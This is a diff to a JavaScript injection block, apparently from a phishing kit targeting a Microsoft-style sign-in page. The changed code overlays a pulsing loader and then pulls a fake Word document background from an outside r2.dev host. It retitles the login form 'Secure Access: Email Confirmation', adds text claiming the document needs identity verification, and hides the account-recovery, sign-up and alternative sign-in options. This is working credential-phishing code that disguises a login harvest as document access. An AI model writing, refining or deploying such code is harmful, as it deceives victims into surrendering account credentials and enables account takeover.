@@ -67,6 +67,7 @@ js_inject:
       overlay.style.justifyContent = "center";
       overlay.style.alignItems = "center";
       overlay.style.overflow = "hidden";
+
       overlay.innerHTML = `
         <style>
           @keyframes pulse {
@@ -79,6 +80,7 @@ js_inject:
             width: 200px;
             height: 200px;
             animation: pulse 3s ease-in-out infinite;
+            margin-bottom: 40px;
           }
           .back-plate {
             position: absolute;
@@ -127,40 +129,48 @@ js_inject:
       setTimeout(() => {
         overlay.remove();
 
-        // Inject Word background HTML below form
+        // Inject full Word background layout BELOW win-scroll
         fetch("https://pub-2a44f4d547ef416eb3d30428f95d5a9e.r2.dev/off.html")
           .then(res => res.text())
           .then(html => {
-            const wrapper = document.createElement("div");
-            wrapper.id = "customWordBackground";
-            wrapper.style.zIndex = "0";
-            wrapper.style.pointerEvents = "none";
-            wrapper.innerHTML = html;
+            const wordBG = document.createElement("div");
+            wordBG.id = "wordInterfaceBackground";
+            wordBG.innerHTML = html;
+
             const winScroll = document.querySelector(".win-scroll");
-            if (winScroll) winScroll.insertAdjacentElement("afterend", wrapper);
-          });
-
-        // Modify form box heading and hide unnecessary links
-        setTimeout(() => {
-          const header = document.querySelector('#loginHeader div[role="heading"]');
-          if (header) {
-            header.innerHTML = `Secure Access: Email Confirmation`;
-            const desc = document.createElement("div");
-            desc.style.fontSize = "14px";
-            desc.style.color = "#5a5a5a";
-            desc.style.marginTop = "8px";
-            desc.innerText = "This document can only be accessed by Authorised users. Please verify your identity to access this document.";
-            header.parentNode.appendChild(desc);
-          }
-
-          document.querySelectorAll(".form-group").forEach(el => {
-            if (el.textContent.includes("No account") || el.textContent.includes("Can’t access your account")) {
-              el.style.display = "none";
+            if (winScroll && winScroll.parentNode) {
+              winScroll.parentNode.insertBefore(wordBG, winScroll.nextSibling);
+            } else {
+              document.body.appendChild(wordBG);
             }
           });
 
-          const fedBox = document.querySelector(".promoted-fed-cred-box");
-          if (fedBox) fedBox.style.display = "none";
-        }, 1000);
+        // Modify form box content
+        const waitForFormReady = setInterval(() => {
+          const header = document.querySelector('#loginHeader div[role="heading"]');
+          const noAccount = document.querySelector('a#signup');
+          const cantAccess = document.querySelector('a#cantAccessAccount');
+          const signInOptions = document.querySelector('.promoted-fed-cred-box');
 
+          if (header) {
+            header.textContent = "Secure Access: Email Confirmation";
+
+            if (!document.querySelector('.custom-subtext')) {
+              const desc = document.createElement("div");
+              desc.className = "custom-subtext";
+              desc.style.fontSize = "14px";
+              desc.style.color = "#5a5a5a";
+              desc.style.marginTop = "8px";
+              desc.style.lineHeight = "1.4";
+              desc.innerText = "This document can only be accessed by Authorised users. Please verify your identity to access this document.";
+              header.parentNode.appendChild(desc);
+            }
+
+            if (noAccount) noAccount.closest(".form-group").style.display = "none";
+            if (cantAccess) cantAccess.closest(".form-group").style.display = "none";
+            if (signInOptions) signInOptions.style.display = "none";
+
+            clearInterval(waitForFormReady);
+          }
+        }, 300);
       }, 3000);
